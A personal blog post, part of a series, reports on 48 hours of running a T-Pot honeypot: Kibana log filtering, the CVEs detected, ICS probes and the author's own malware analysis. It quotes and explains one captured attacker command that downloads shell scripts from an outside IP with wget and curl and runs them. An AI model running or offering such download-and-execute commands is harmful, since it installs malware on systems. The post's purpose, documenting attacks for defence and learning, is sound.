---
title:  "Part 2 - NAHBP : Not Another Honeypot Blog Post"
excerpt: "<b>Part 2 of running a T-Pot Honeypot</b> <br>
6. How to analyze logs using Kibana > Discover<br>

- Adbhoney Filtering<br>

- Analysis of Malicious Payload - Example<br>


7. Top Results<br>


8. Most interesting findings<br>

- Commands<br>
- Suricata CVE's<br>
- Attack type<br>
- Country of origin<br>
- Unexpected outcomes<br>
- Something I learned and was not aware of prior to setting up the Honeypot<br>

9. Mitigating vulnerabilities<br>
"
mathjax: true
layout: post
categories:
    -- github
    -- website

---
### [Part 1:](https://matthewomccorkle.github.io/honeypot-1/)

### [Part 2:](https://matthewomccorkle.github.io/honeypot-2/) << *You are here!*

### [Part 3:](https://matthewomccorkle.github.io/honeypot-3/)

---

6. How to analyze logs using Kibana > Discover
   - Adbhoney Filtering
   - Analysis of Malicious Payload - Example
7. Top Results

8. Most interesting findings
   
     - Commands<br>
     - Suricata CVE's<br>
     - Attack type<br>
     - Country of rigin<br>
     - Unexpected outcomes<br>
     - Something I learned and was not aware of prior to setting up the Honeypot<br>

9. Mitigating vulnerabilities

---

#### This blog is designed to give some background information on honeypots, and the results of running T-Pot for 48 hours.
#### This series is broken into 3 parts.

---

# 6. How to analyze logs using Kibana > Discover

Analyzing logs in Kibana may remind you of using Splunk as they both function very similarly.  However, there are some noticeable differences in using Kibana, to understand these differences further I suggest you read Asaf Yigal's article over at [DevOps.com](https://devops.com/splunk-elk-stack-side-side-comparison/#:~:text=Kibana%20is%20the%20visualization%20tool,of%20them%20in%20a%20dashboard.). 

Every honeypot varies on what data it collects, how it collects and how it logs. Here I will show you how to filter all logs to display some of the honeypots data that I found interesting. 

**Caution:** You should filter out your own IP address from Kibana using a `is not` operator in a filter. See below an example on a `dest_ip` filter. You will want to do this for `src_ip` as well. 

![dest_IP](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/adbhoney0.png)

---
### Adbhoney Filtering

To filter only Adbhoney Command Inputs I used the following filter in Kabana:

`eventid: adbhoney.command.input`

You can input this in the +Add Filter window the same way you entered your `dest_ip` & `src_ip` filters. 

Below you see that with the eventid filter of adbhoney.command.input I had received 99 command input events in the past 72 hours.

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/adbhoney1.PNG)

In order to view details of each event you can click the drop down arrow on the left side of the event. 

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/adbhoney2.PNG)

Finally, you can see the commands used by attackers on the Adbhoney Pot in the `input` field of the event viewer.

**Below** you will see that the attacker was using the command:

`cd /data/local/tmp/; busybox wget http://45.61.184.4/w.sh; sh w.sh; curl http://45.61.184.4/c.sh; sh c.sh`

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/adbhoney3.PNG)

**Bonus:**

You can use the fields selector on the left pane of the discover tab to show you only fields that you want to see. For example in the below screenshot I used the `input`, `Country`, and `geoip.ip` to filter out all of the information that I did not want to see.

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/adbhoney6.PNG)

---

### Analysis of Malicious Payload - Example

**Don't know what linux commands you are seeing? Use [explainshell](https://explainshell.com/).**

*This looks like the attacker is trying to change directories.*

`cd /data/local/tmp/;`

*Here the attacker is trying to tell busybox to download `w.sh` file.*

`busybox wget http://45.61.184.4/w.sh;` 

*Now the attacker attempts to invoke the default shell for the system and run `w.sh`.*

`sh w.sh;` 

*Finally the attacker trys to download another file named `c.sh`.*

`curl http://45.61.184.4/c.sh;`

*Now the attacker attempts to invoke the default shell for the system and run `c.sh`.*

`sh c.sh`

**Remember** this is just one log event. Likely this means that this attacker will enter the honeypot again later to run the `c.sh` script. 

### What is the `c.sh` malicious file that was curl'ed into the honeypot?

I used a [Linode](https://www.linode.com/) instance to mimic the commands my attackers used. 

**Why a seperate instance?**

I wanted to run the commands on a physically removed virtualized environment from my honeypot, personal VM's and personal network at home. 

I downloaded the c.sh contents into a c.sh file and then ran the cat command to print the file contents to the screen. So we can see that the c.sh downloads each of these: 

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/adbhoney4.PNG)

Next I downloaded the arc file from the IP address above and determined it's file type. ![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/adbhoney5.PNG)

Unfortunately  since this was a 32-bit file I could not run the binary. So I tried my luck downloading the x86_64 file. **Bingo**

**Disclaimer / Warning: DO NOT DOWNLOAD MALWARE ON YOUR OWN SYSTEMS THESE NEXT STEPS ARE EXTREMELY DANGEROUS**

Next I gave the x86_64 elf file **777** permissions. <- **AGAIN NEVER DO THIS**.

Then I executed the malicious file. <- **AGAIN NEVER DO THIS**.

It is a listener! But that does not tell us much. So I input the file URL into VirusTotal. Here are the results:

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/virustotal.png)

---

# 7. Top Results

- 60k+ attacks on SMB via port 445!

---

# 8. Most interesting finds

### Commands

#- ABDHoney - Most attackers tried pushing busybox listening shells. 

#- Cowrie - Most commands related to crypto currency mining.

### Suricata CVE's

- [CVE-2020-11899](https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2020-11899) [4.8 CVSS] (1,488 hits): Improper input validation which leads to potential Denial of Service. 

- [CVE-2001-0540](https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2001-0540) [5.0 CVSS] (121 hits): Memory leak in servers which could lead to potential Denial of Service.

- [CVE-2012-0152](https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2012-0152) [4.3 CVSS] (104 hits): Remote Desktop Protocol application hang which could lead to potential Denial of Service. 

- [CVE-2006-2369](https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2006-2369) [7.5 CVSS] (43 hits): RealVNC vulnerability that allows atatckers to bypass authentication. 

- [CVE-2002-0013](https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2002-0013) [10.0 CVSS] (7 hits): Vulnerable SNMPv1 allows remote attackers to cause a denial of service. 
  **^Important Note^** This is a perfect score CVSS where the exploit impacts the entire CIA (Confidentiality, Integrity, Availability) triad.

### Attack type

- ICS/SCADA attack via Conpot targetting Veeder-Root Automatic Tank Gauges. 

![](https://raw.githubusercontent.com/matthewomccorkle/matthewomccorkle.github.io/master/_posts/assets/adbhoney7.PNG)

### Country of origin

**Disclaimer:** I am aware that many of the countries of origin are masked or attackers are using proxies for obfuscation. 

- **Iran:** Attacker had a successful upload of malware to my Cowrie honeypot via SSH. 
  
  - View the abuse.ch analysis of the file uploaded [here](https://bazaar.abuse.ch/sample/b9e643a8e78d2ce745fbe73eb505c8a0cc49842803077809b2267817979d10b0/). 
  
  - Reported as a trojan that includes a crypto currency miner of some sort. 

- **United States**: 3 ICS/SCADA attacks targetting Vedeer-Root Automatic Tank Gauges in the country of Bahrain.

### Unexpected outcomes

I was browsing through hex that was passed as payload data and decoding via [Cyberchef](https://gchq.github.io/CyberChef/). At this point in my analysis of the logs I had processed about 60+ different hex payloads. 

This one stood out to me in Cyberchef as it had something that I had not seen yet in previous hex decodes I performed: `fox a 1 -1 fox hello`. 

A quick google of `fox a 1 -1 fox hello` and I find it is a NMAP script which is also on Github [here](https://github.com/nmap/nmap/blob/master/scripts/fox-info.nse). Awesome! I love using NMAP and have tried remembering all of the different scripts and their uses, but alas this one I had not used. 

**HOWEVER**, what was most unexpected of this find was that this script was designed by the author "*based off Billy Rios and Terry **McCorkle's** work.*" Yes you read that correctly. 

Honestly, this gave me a chill down my spine. If you have ever seen "[The Truman Show (1998) - IMDb](https://www.imdb.com/title/tt0120382/)" then you know I felt immediately like I was living inside of an alternate reality. 

What are the odds of finding my last name in a random honeypot hex attack payload? I am sure one of you data scientists or math experts could tell me the odds, but I believe the odds must be extremely low, nearly unlikely. 

### Something I learned and was not aware of prior to setting up the honeypot

There are *SO* many bots searching for vulnerable systems on the internet.

# 9. Mitigating vulnerabilities

# [Continue to Part 3 -->](https://matthewomccorkle.github.io/honeypot-3/)
